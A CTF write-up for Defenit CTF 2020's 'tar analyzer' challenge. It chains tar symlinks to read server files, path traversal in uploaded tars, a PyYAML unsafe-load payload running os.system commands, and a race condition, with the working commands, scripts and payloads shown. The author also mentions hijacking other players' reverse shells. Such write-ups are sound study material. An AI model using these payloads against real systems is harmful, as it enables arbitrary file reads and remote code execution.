# Defenit-CTF Write-Up - tar analyzer

I had a lot of fun and learning with this challenge!

I have a much simpler report here.
I wrote a much more detailed story, but in Portuguese:
https://medium.com/@neptunian.hacker/defenit-ctf-2020-write-up-tar-analyzer-web-hacking-29ed5be3f5f4?sk=a583e7812f82b59d0cf48d65e40468bc

### 1. Used symlinks with relative paths, inside the uploaded tarfile, to read any file in the target server.

```
$ ln -s ../../config.yaml config.txt
$ tar cvf config.tar config.txt
config.txt
```

In the sample above, I can read the config.yaml file on the server after uploading config.tar. 
"Sadly", the flag is not there.

### 2. Used Zip Sliping to write files in the source directory.

Created a tarball with relative paths in the inner files, using the tarfile Python package.

```
$ echo “Up One Level” > ../nivel.txt
$ python
Python 3.7.4 (default, Aug 13 2019, 20:35:49) 
[GCC 7.3.0] :: Anaconda, Inc. on linux
Type “help”, “copyright”, “credits” or “license” for more information.
>>> import tarfile
>>> tar = tarfile.open(“uplevel.tar”, “w”)
>>> tar.add(“../nivel.txt”)
>>> tar.close()
>>> quit()
$ tar tvf uplevel.tar 
tar: Removing leading `../’ from member names
-rw-r — r — neptunian/neptunian 17 2020–06–11 16:28 ../nivel.txt
```
Used this to overwrite the ../../config.yaml file, but it is reset again by the initialize() function

### 3. Tested the PyYAML vulnerability (locally) to check if the application code is flawed

**No file**
```
$ cat /tmp/nep.txt
cat: /tmp/nep.txt: No such file or directory
```

**Create Payload file**
```
$ cat sample.yaml 
!!python/object/apply:os.system [
 !!str “find ../ > /tmp/nep.txt”,
]
```

**Load the same way as the target**
```
$ python
Python 3.7.4 (default, Aug 13 2019, 20:35:49) 
[GCC 7.3.0] :: Anaconda, Inc. on linux
Type “help”, “copyright”, “credits” or “license” for more information.
>>> from yaml import *
>>> fp = open(‘sample.yaml’, ‘rb’)
>>> config = load(fp.read(), Loader=Loader)
>>> quit()
$ cat /tmp/nep.txt 
../
../other_files.txt
../f528764d624db129b32c21fbca0cb8d6
../9eea719ae29960691c72dac70bd0a33a
../9eea719ae29960691c72dac70bd0a33a/config2.txt
$
```

It lives!

### 4. Used Race Condition to get the flag

Since initialize() and hostcheck() are called in sequence, there is a very small window of opportunity here.
I believe multiple tar uploads would not work because the request takes too long, in comparison with the /admin call.

I created a tar file with 5000 (yes, thousands) of config.yaml files to force a loop in the extractall() call.

Organizers: Sorry to upload 5MB files. You forced me to do it :innocent:

```
import tarfile

tar = tarfile.open("nep3.tar", "w")
for i in range(1,5000):
    tar.add("../../config.yaml")

tar.close()
```

I used the following final yaml payload (I know everybody else tried reverse shells because I saw them doing it).
Sent to /tmp to avoid other hackers getting a hint from me (sorry guys).
```
!!python/object/apply:os.system [
  !!str "ls -l / > /tmp/owned3.txt; env >> /tmp/owned3.txt; netstat -an >> /tmp/owned3.txt",
]
```

After uploading the nep3.tar (which took a lot of time), I started a loop in the /admin url:
```
for i in $(seq 1 100); do curl http://target_host/admin/; done
```

After about 3 tries, the /tmp/owned3.txt was created and I got it using the symlinks.
I found the /flag.txt and got it with another symlink (I think I was the only one who didnt guess the file location).

Owned!

**Defenit{R4ce_C0nd1710N_74r_5L1P_w17H_Y4ML_Rce!}**


### My sorry and thanks to others hackers

While reading the config.yaml on the server, I say hackers trying the PyYAML vulnerability and others, before I even understood what was it (At first, I thought it was some strange behaviour of the challenge itself). 
I connected to some reverse shells and may have sent some greetings after receiving the **ls** :laughing:

If your IP was 52.34.X.X, I hope I didnt delayed you so much, lol.

Sorry and thank you all.
